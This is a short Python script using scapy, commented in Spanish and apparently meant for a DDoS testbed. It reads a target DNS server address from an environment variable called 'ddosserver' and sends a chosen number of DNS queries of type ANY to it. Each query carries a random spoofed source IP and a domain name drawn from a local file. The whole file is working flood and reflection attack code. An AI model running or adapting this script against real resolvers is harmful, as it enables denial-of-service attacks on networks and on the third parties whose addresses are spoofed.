from scapy.all import *
import os
import random
import sys

# Obtén la dirección IP del servidor desde la variable de entorno
ddosserver_ip = os.getenv("ddosserver")

if ddosserver_ip is None:
    print("No se proporcionó una dirección IP para el servidor. Asegúrate de configurar la variable de entorno ddosserver. Ejecuta export ddosserver=¨ip¨")
    exit()

# Verifica la cantidad de paquetes DNS proporcionada como argumento
if len(sys.argv) != 2:
    print("Usage: python3 script.py <dns_query_packets>")
    exit(1)

try:
    dns_query_packets = int(sys.argv[1])
except ValueError:
    print("The argument value must be a valid integer.")
    exit(1)

# Leer los nombres de dominio desde el archivo
with open("/home/cognet/domain.txt", 'r') as file:
    qnames = file.read().splitlines()

open_dns_resolver = ddosserver_ip  # Reemplaza con la dirección IP de tu servidor DNS

for _ in range(dns_query_packets):
    # Selecciona un nombre de dominio aleatorio de la lista
    spoofed_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    qname = random.choice(qnames)

    # Crea el paquete DNS con dirección IP de origen aleatoria y nombre de dominio aleatorio
    dns_query = IP(src=spoofed_ip, dst=open_dns_resolver) / UDP(sport=RandShort(), dport=53) / \
                DNS(rd=1, qd=DNSQR(qname=qname, qtype="ANY"))

    # Envía el paquete
    send(dns_query)
